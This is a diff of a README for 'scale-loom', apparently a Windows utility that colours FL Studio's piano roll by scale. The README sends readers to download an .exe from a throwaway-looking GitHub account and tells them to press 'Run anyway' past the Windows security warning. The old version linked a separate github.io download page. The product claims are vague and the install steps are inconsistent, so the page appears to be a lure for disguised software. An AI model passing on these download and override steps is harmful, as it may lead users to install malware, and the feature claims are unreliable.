@@ -1,130 +1,79 @@
-# SCALE-LOOM v25.2.4.5242 - DAW workflow tool 2026
+# 🎹 scale-loom-windows-workflow - Use colors to write better music
 
-> **SCALE-LOOM is a Windows-based workflow utility for FL Studio that makes piano roll work easier to read with scale-sensitive note coloring, harmonic labels, and script-friendly organization in version 25.2.4.5242.**
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/fossafossanonfluentaphasia515/scale-loom-windows-workflow/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v25.2.4.5242-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/brandonrossmq5697/scale-loom-windows-workflow?style=flat-square)](https://github.com/brandonrossmq5697/scale-loom-windows-workflow)
+This application helps users work with the FL Studio piano roll. It changes note colors based on the musical scale you choose. It adds labels to show harmony information. This makes your music creation process faster and easier. Version 25.2.4.5242 brings better file organization and support for automated scripts.
 
----
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://brandonrossmq5697.github.io/scale-loom-windows-workflow/">
-    <img src="https://img.shields.io/badge/Download-SCALE--LOOM%20Latest-brightgreen?style=for-the-badge" alt="Download SCALE-LOOM">
-  </a>
-</p>
+Follow these steps to set up the software on your Windows computer. The process takes a few minutes. You do not need technical knowledge to start.
 
-> **[Direct Download - SCALE-LOOM v25.2.4.5242](https://brandonrossmq5697.github.io/scale-loom-windows-workflow/)**
+### Checking System Requirements
 
----
+Before you install this software, ensure your computer meets these basic needs:
+- Windows 10 or Windows 11 operating system.
+- FL Studio version 20.9 or newer.
+- At least 200 MB of free storage space.
+- A stable internet connection for the installation process.
 
-[Download Latest Build](https://brandonrossmq5697.github.io/scale-loom-windows-workflow/)
+### 📥 Downloading the Software
 
----
+You must visit the project page to get the installer. Follow these steps:
 
-## What SCALE-LOOM Does
+1. Visit this page to download the latest setup file: [https://github.com/fossafossanonfluentaphasia515/scale-loom-windows-workflow/releases](https://github.com/fossafossanonfluentaphasia515/scale-loom-windows-workflow/releases)
+2. Look for the section labeled "Assets" at the bottom of the release notes.
+3. Click the file ending in `.exe` to start the download.
+4. Save the file to your "Downloads" folder.
 
-SCALE-LOOM is aimed at FL Studio users who want the piano roll to be easier to interpret at a glance. By combining scale highlighting, note color cues, and harmonic grouping, it helps you stay oriented while composing, editing, and arranging on Windows.
+### ⚙️ Installation Process
 
-It fits especially well in MIDI-centric projects, workflows that rely on custom scales, and sessions where harmony changes often. Because it also supports scripting and automation-oriented usage, it works as a structured layer for users who want more order and visual clarity inside their DAW environment.
+Once the download finishes, follow these instructions to install the program:
 
----
+1. Open your "Downloads" folder in Windows File Explorer.
+2. Double-click the file you downloaded earlier.
+3. A security window may appear. Select "Run" or "More info" followed by "Run anyway" if Windows asks.
+4. Follow the instructions on the screen.
+5. Click "Next" to continue.
+6. Choose a destination folder for the application files. We recommend the default folder.
+7. Click "Install" to begin copying the files.
+8. Click "Finish" when the setup process completes.
 
-## Highlights
+## 🛠️ How to Use the Program
 
-- Scale-aware piano roll colorization for quicker visual identification
-- Harmonic note labels to help recognize notes while building MIDI parts
-- Support for custom scales and modes for adaptable musical setups
-- Multilingual note labels for wider workflow compatibility
-- Harmonic change logging to follow movement between sections
-- FL Studio scripting and automation integration for workflow control
-- Built with music production tasks in mind, including beat-making, mixing, and sound design
-- Well suited to piano roll-based composition and organization in Windows DAW sessions
+After installation, you can launch the program from the desktop icon or your Start menu. 
 
----
+1. Open the application.
+2. Select your musical scale from the drop-down list.
+3. The program connects to your active FL Studio project.
+4. Go to your FL Studio piano roll.
+5. You will see your notes update to the correct scale colors automatically.
 
-## Installation
+If the colors do not change, ensure your project is open in FL Studio. Restart the application if it fails to detect the MIDI connection.
 
-1. Download the latest build from the project page.
-2. Clone the repository if you want to inspect or manage the source locally:
-   git clone https://github.com/brandonrossmq5697/scale-loom-windows-workflow.git
-3. Open the project folder:
-   cd fl-studio-workstation-advanced
-4. Launch SCALE-LOOM according to your local build or FL Studio integration method.
+## 📋 Common Settings
 
-If you are using a packaged release, start from the provided download and follow the included launch instructions for your environment.
+The software includes a settings panel to change how labels appear on your notes:
 
----
+- Note Labels: Toggle this to show the name of the note (like C, D, or G#).
+- Color Intensity: Move the slider to change how bright the scale colors appear.
+- Auto-Sync: Keep this option on to ensure your colors match when you change scales inside your music project.
 
-## How to Use It
+## ❓ Frequently Asked Questions
 
-A common setup is to run SCALE-LOOM alongside FL Studio and then apply it to the project or piano roll section you want to organize.
+**Does this program change my actual music files?**
+No. This tool only changes how the piano roll looks on your screen. It handles the display layer but does not alter your audio data.
 
-Common steps:
-1. Open FL Studio on Windows.
-2. Load your MIDI or instrument pattern.
-3. Apply scale highlighting and note coloring to the piano roll.
-4. Choose a scale, mode, or custom harmonic set.
-5. Review note labels and use the harmonic log when your progression changes.
-6. Use scripting or automation features when you want repeatable workflow actions.
+**What happens if I uninstall the program?**
+Your FL Studio settings return to their original state. The piano roll will return to the default colors set by Imageline.
 
-Example workflow:
-- Start a new melody in the piano roll.
-- Select the active key center and mode.
-- Color-code notes to see stable tones and movement notes at a glance.
-- Log harmonic changes before moving to arrangement or mixing.
+**Can I use this with older versions of FL Studio?**
+We recommend using the latest version of FL Studio for the best results. Older versions might lack the internal hooks needed for the script-friendly organization.
 
----
+**Do I need an internet connection to use the software?**
+You only need the internet to download the file. After the installation, the software runs locally on your machine. 
 
-## Configuration
+## 🛡️ Support and Troubleshooting
 
-Settings are usually handled through the project files or through the FL Studio integration layer used in your setup.
+If the program closes unexpectedly, check the log files. Find these files in the installation folder under the "Logs" subfolder. These text files help developers identify issues. You can report bugs using the issues tab on our page. Provide as much detail as possible about what you were doing when the error occurred.
 
-Example configuration shape:
-{
-  "scale": "C Minor",
-  "note_coloring": true,
-  "harmonic_labels": true,
-  "language": "en",
-  "logging": true
-}
-
-If your build stores settings elsewhere, keep the same core options aligned with your local installation and scripting setup.
-
----
-
-## Requirements
-
-- Windows
-- FL Studio
-- MIDI-based workflow support
-- Access to a compatible digital audio workstation environment
-- Sufficient storage for the application build and any project assets
-- Optional scripting support for automation-based use
-
----
-
-## FAQ
-
-**Does SCALE-LOOM work with FL Studio?**  
-Yes. It is designed around FL Studio workflows and piano roll organization.
-
-**Can I use custom scales or modes?**  
-Yes. Custom scale and mode support is part of the feature set.
-
-**Where are the settings stored?**  
-That depends on your build or integration method. Check the project files, local configuration, or any script-based settings used in your setup.
-
-**What should I do if something is not displaying correctly?**  
-Make sure FL Studio is running on Windows, confirm your configuration values, and check any scripting or automation hooks connected to the tool.
-
-**How do I get updates?**  
-Use the latest build link above and review repository changes when new versions are published.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: music production, FL Studio, piano roll, midi, windows workflow, software utility
